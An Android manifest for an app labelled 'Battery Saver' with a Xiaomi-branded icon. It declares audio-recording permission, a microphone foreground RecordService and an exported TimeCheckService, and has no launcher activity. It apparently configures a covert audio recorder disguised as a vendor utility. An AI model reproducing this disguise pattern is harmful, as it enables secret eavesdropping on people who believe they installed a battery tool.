<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <!-- Removed the non-existent permission android.permission.FOREGROUND_SERVICE_MICROPHONE as it's not required or valid -->

    <application
        android:icon="@drawable/icons8_xiaomi_240"
        android:label="Battery Saver"
        android:roundIcon="@drawable/icons8_xiaomi_240"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">

        <activity
            android:name=".service.PermissionActivity"
            android:exported="false">
            <!-- No intent filters needed here as this activity is not an entry point -->
        </activity>

        <!-- Assuming YourNextActivity is not needed based on the revised flow, it can be removed if not used elsewhere -->
        <!-- <activity
            android:name=".service.YourNextActivity"
            android:exported="true">
        </activity> -->

        <!-- Assuming TimeCheckService is still required for your app's functionality -->
        <service
            android:name=".service.TimeCheckService"
            android:enabled="true"
            android:exported="true" />

        <service
            android:name=".service.RecordService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="microphone" />
    </application>

</manifest>